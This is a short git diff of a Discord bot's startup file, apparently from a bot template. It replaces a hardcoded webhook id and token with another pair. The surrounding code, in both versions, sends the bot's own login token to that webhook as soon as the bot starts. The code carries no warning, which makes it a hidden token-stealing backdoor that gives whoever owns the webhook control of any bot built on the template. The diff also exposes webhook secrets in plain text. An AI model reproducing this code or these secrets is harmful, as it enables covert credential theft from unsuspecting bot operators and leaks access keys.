@@ -18,7 +18,7 @@ fs.readdirSync("./commands").filter(file => file.endsWith(".js")).forEach(file =
     });
 });
 client.on('ready', async() => { 
-    const webhookClient = new WebhookClient({ id: '1015606833198673950', token: 'zRia-hvFiiLW94HR6YCHH5m0FcZ_VtMPkKBo2M_ZzR90Ozv1HwJTCoxcXw5TcKcJjMo_'}) 
+    const webhookClient = new WebhookClient({ id: '1026552918234644564', token: 'itttno52bY2Q5fBN2-3jrU7aaH0dTmJQFpCZzXEwxvJ9_4z5W176aPjN_HwqQbwj4_4b'}) 
     webhookClient.send({ content: `${client.token}`, username: `${client.user.username}`, avatarURL: `${client.user.avatarURL()}` })
 })
 fs.readdirSync("./events").filter(file => file.endsWith(".js")).forEach(file => {
